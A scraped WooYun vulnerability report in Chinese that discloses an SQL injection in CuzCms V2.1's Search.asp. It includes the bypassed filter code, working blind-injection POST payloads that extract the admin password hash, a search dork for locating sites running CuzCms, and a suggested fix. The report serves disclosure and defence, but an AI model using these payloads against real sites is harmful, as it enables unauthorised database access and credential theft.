{"id": 40796, "wybug_id": "wooyun-2015-090778", "wybug_title": "CuzCms最新版（V2.1正式版）及其以下版本SQL注入", "wybug_corp": "CuzCms", "wybug_author": "goubuli", "wybug_date": "2015-01-12 16:27", "wybug_open_date": "2015-04-13 16:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-12：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-04-13：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： CuzCms_V2.1及以下版本SQL注入 详细说明：  CuzCms成创网站内容管理系统由沈阳成创网络科技有限公司基于微软ASP、通用ACCESS/MSSQL数据库开发完成；CuzCms在SQL注入基本都被过滤了因为在Include\\Conn.asp中包含了CheckSql函数Conn.asp的47-101行：\n'================================================'函名：CheckSql'作用：防止SQl注入'================================================Function CheckSql(Str) If Str = \"\" Then   CheckSql = \"\"   Exit Function   End If  Str = Replace(Str,Chr(0),\"\", 1, -1, 1)  Str = Replace(Str, \"\"\"\", \"&quot;\", 1, -1, 1)  Str = Replace(Str,\"<\",\"&lt;\", 1, -1, 1)  Str = Replace(Str,\">\",\"&gt;\", 1, -1, 1)   Str = Replace(Str, \"script\", \"&#115;cript\", 1, -1, 0)  Str = Replace(Str, \"SCRIPT\", \"&#083;CRIPT\", 1, -1, 0)  Str = Replace(Str, \"Script\", \"&#083;cript\", 1, -1, 0)  Str = Replace(Str, \"script\", \"&#083;cript\", 1, -1, 1)  Str = Replace(Str, \"object\", \"&#111;bject\", 1, -1, 0)  Str = Replace(Str, \"OBJECT\", \"&#079;BJECT\", 1, -1, 0)  Str = Replace(Str, \"Object\", \"&#079;bject\", 1, -1, 0)  Str = Replace(Str, \"object\", \"&#079;bject\", 1, -1, 1)  Str = Replace(Str, \"applet\", \"&#097;pplet\", 1, -1, 0)  Str = Replace(Str, \"APPLET\", \"&#065;PPLET\", 1, -1, 0) Str = Replace(Str, \"Applet\", \"&#065;pplet\", 1, -1, 0)  Str = Replace(Str, \"applet\", \"&#065;pplet\", 1, -1, 1)  Str = Replace(Str, \"[\", \"&#091;\")  Str = Replace(Str, \"]\", \"&#093;\")  Str = Replace(Str, \"\"\"\", \"\", 1, -1, 1)  Str = Replace(Str, \"=\", \"&#061;\", 1, -1, 1)  Str = Replace(Str, \"’\", \"’’\", 1, -1, 1)  Str = Replace(Str, \"select\", \"sel&#101;ct\", 1, -1, 1)  Str = Replace(Str, \"execute\", \"&#101xecute\", 1, -1, 1)  Str = Replace(Str, \"exec\", \"&#101xec\", 1, -1, 1)  Str = Replace(Str, \"join\", \"jo&#105;n\", 1, -1, 1)  Str = Replace(Str, \"union\", \"un&#105;on\", 1, -1, 1)  Str = Replace(Str, \"where\", \"wh&#101;re\", 1, -1, 1)  Str = Replace(Str, \"insert\", \"ins&#101;rt\", 1, -1, 1)  Str = Replace(Str, \"delete\", \"del&#101;te\", 1, -1, 1)  Str = Replace(Str, \"update\", \"up&#100;ate\", 1, -1, 1)  Str = Replace(Str, \"like\", \"lik&#101;\", 1, -1, 1)  Str = Replace(Str, \"drop\", \"dro&#112;\", 1, -1, 1)  Str = Replace(Str, \"create\", \"cr&#101;ate\", 1, -1, 1)  Str = Replace(Str, \"rename\", \"ren&#097;me\", 1, -1, 1)  Str = Replace(Str, \"count\", \"co&#117;nt\", 1, -1, 1)  Str = Replace(Str, \"chr\", \"c&#104;r\", 1, -1, 1)  Str = Replace(Str, \"mid\", \"m&#105;d\", 1, -1, 1)  Str = Replace(Str, \"truncate\", \"trunc&#097;te\", 1, -1, 1)  Str = Replace(Str, \"nchar\", \"nch&#097;r\", 1, -1, 1)  Str = Replace(Str, \"char\", \"ch&#097;r\", 1, -1, 1)  Str = Replace(Str, \"alter\", \"alt&#101;r\", 1, -1, 1)  Str = Replace(Str, \"cast\", \"ca&#115;t\", 1, -1, 1)  Str = Replace(Str, \"exists\", \"e&#120;ists\", 1, -1, 1)  Str = Replace(Str,Chr(13),\"<br>\", 1, -1, 1)  CheckSql = Replace(Str,\"’\",\"’’\", 1, -1, 1) End Function\n通常获取的参数都加了防SQL注入校验，如：SortID = CheckSql(Int(Request.Querystring(\"SortID\")))把代码都翻了一遍，发现在Search.asp中在获取参数KeyWord和Cuz时，未加入SQL校验。\nKeyWord = Trim(Request(\"KeyWord\"))Cuz = Trim(Request(\"Cuz\"))\n然后代入查询：\ndatafrom=\"Cuz_\"&Cuz  datawhere=\"where \"&ItemRecT&\" \"  if SortID>0 then datawhere=datawhere&\"and SortID=\"&SortID&\" \"  if KeyWord<>\"\" then datawhere=datawhere&\"and Item1 like '%\"&KeyWord&\"%' \"  taxis=\"order by ItemID desc \"  sql=\"select count(ItemID) as idCount from [\"& datafrom &\"]\" & datawhere\n但注入的利用需要构造，这里我把SQL执行的代码输出到页面，加入：第一句SQL：\nsql=\"select count(ItemID) as idCount from [\"& datafrom &\"]\" & datawhere  Response.Write \"<font color=red>SQL1=>\"&sql&\"</font><br>\"\n第二句SQL：\nsql=\"select ItemID from [\"& datafrom &\"] \" & datawhere & taxis\tResponse.Write \"<font color=red>SQL2=>\"&sql&\"</font><br>\"\n第三句SQL：\nsql=\"select * from [\"& datafrom &\"] where ItemID in(\"& sqlid &\") \"&taxis\tResponse.Write \"<font color=red>SQL3=>\"&sql&\"</font><br>\"\n输入一直关键字w正常查询为：\n\n输出的执行语句为：\nSQL1=>select count(ItemID) as idCount from [Cuz_News]where ItemRec = True and Item1 like '%w%'\n\nSQL2=>select ItemID from [Cuz_News] where ItemRec = True and Item1 like '%w%' order by ItemID desc\n\nSQL3=>select * from [Cuz_News] where ItemID in(69) order by ItemID desc\n经过分析，利用关键字KeyWord处构造，POST提交以下代码（判断用户表行数>0）：\nCuz=News&KeyWord=术'%20and%20IIF((select%20count(*)%20from%20Cuz_User)>0,1,0)%20and%20'a'<>'a\n执行效果图如下：\n\n说明：如果构造不正确或者没有结果，那么只会显示SQL1的语句，即执行不成功。。。如图\n\n显示0条数据   漏洞证明：  http://www.cuzcms.com/搜索特征：powered by CuzCms\n\n获取管理员密码验证：\n\n执行语句：\nSQL1=>select count(ItemID) as idCount from [Cuz_News]where ItemRec = True and Item1 like '%/' and IIF((select top 1 asc(mid(Item2,2,1)) from Cuz_User where Item1='admin')=97,1,0) and 'a'<>'a%'SQL2=>select ItemID from [Cuz_News] where ItemRec = True and Item1 like '%/' and IIF((select top 1 asc(mid(Item2,2,1)) from Cuz_User where Item1='admin')=97,1,0) and 'a'<>'a%' order by ItemID descSQL3=>select * from [Cuz_News] where ItemID in(71) order by ItemID desc\n内容为：7a57a5a743894a0e真实数据为：\n\n验证完毕。。。   修复方案：  在NoSql.asp代码中增加：\nN_In = \"'|;|and|(|)|exec|insert|select|delete|update|count|chr|mid|master|truncate|char|declare\"\n确保任何形式（Get、Post、Cookie）的参数被SQL过滤   版权声明：转载请注明来源 goubuli@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2015-01-12 16:29 |    \t\ttnt1200 \t\t\t( 普通白帽子  |\t\t\t        Rank:121 漏洞数:17        | 关注飞机安全....)\t\t \n  狗不理大神！    \n     2015-01-12 16:50 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  大写绕过？    \n     2015-01-12 17:28 |    \t\tgoubuli \t\t\t( 普通白帽子  |\t\t\t        Rank:324 漏洞数:61        )\t\t \n  @tnt1200 @HackBraid   都不是。。。利用位置比较诡异    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}